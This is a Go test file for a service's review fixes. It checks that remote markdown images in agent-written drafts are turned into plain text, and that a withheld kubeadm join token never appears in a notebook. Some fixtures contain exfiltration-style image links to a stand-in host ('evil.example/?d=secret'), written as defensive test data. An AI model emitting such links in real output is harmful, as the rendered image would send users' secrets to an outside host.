package service

import (
	"context"

	"strings"
	"testing"
)

// Review fixes for notebooks and the agent (§18).

// A remote image in a draft would be fetched by the webview when the draft
// opens, with whatever the model put in its URL: every image but a data:
// one becomes text. Code is left as written.
func TestDefuseImages(t *testing.T) {
	cases := map[string]string{
		"see ![chart](https://evil.example/?d=secret) here":                                 "see chart `https://evil.example/?d=secret` here",
		"![](http://x.example/a.png)":                                                       "`http://x.example/a.png`",
		`![t](https://x.example/a.png "title")`:                                             "t `https://x.example/a.png`",
		"![ok](data:image/png;base64,AAAA)":                                                 "![ok](data:image/png;base64,AAAA)",
		"![ref][logo]\n\n[logo]: https://evil.example/l.png":                                "!\\[ref][logo]\n\n[logo]: https://evil.example/l.png",
		"[![badge](https://evil.example/b.svg)](https://example.com)":                       "[badge `https://evil.example/b.svg`](https://example.com)",
		"`![in code](https://x.example/c.png)` and \\![escaped](u)":                         "`![in code](https://x.example/c.png)` and \\![escaped](u)",
		"```md\n![fenced](https://x.example/f.png)\n```\n![after](https://x.example/g.png)": "```md\n![fenced](https://x.example/f.png)\n```\nafter `https://x.example/g.png`",
	}
	for in, want := range cases {
		if got := defuseImages(in); got != want {
			t.Errorf("defuseImages(%q)\n got %q\nwant %q", in, got, want)
		}
	}
	// Whatever the input, no inline image with a remote URL is left
	// outside code.
	for _, in := range []string{"![a![b](https://x.example/n.png)", "![x](<https://x.example/a b.png>)", "!![x](https://x.example/y.png)"} {
		out := defuseImages(in)
		if strings.Contains(out, "](https://") && strings.Contains(out, "![") && !strings.Contains(out, `!\[`) {
			t.Errorf("defuseImages(%q) = %q still holds an image", in, out)
		}
	}
}

// A notebook the agent writes that names a value Keel withheld ({{name}})
// says so, and never holds the value.
func TestAgentNotebookWithheldFlag(t *testing.T) {
	f := newNbFixture(t, "```keel-notebook\n{\"title\": \"T\", \"body\": \"kubeadm join --token "+nbCaptured+"\"}\n```")
	resp, err := f.svc.Ask(context.Background(), AskRequest{ConversationID: conv, Question: "write this up"})
	if err != nil {
		t.Fatal(err)
	}
	p := resp.Notebooks[0]
	nb, _ := f.st.GetNotebook(p.NotebookID)
	if !p.Withheld || !strings.Contains(notebookText(nb), "{{join_token}}") || strings.Contains(notebookText(nb), nbCaptured) {
		t.Fatalf("card = %+v, notebook %+v", p, nb)
	}
}
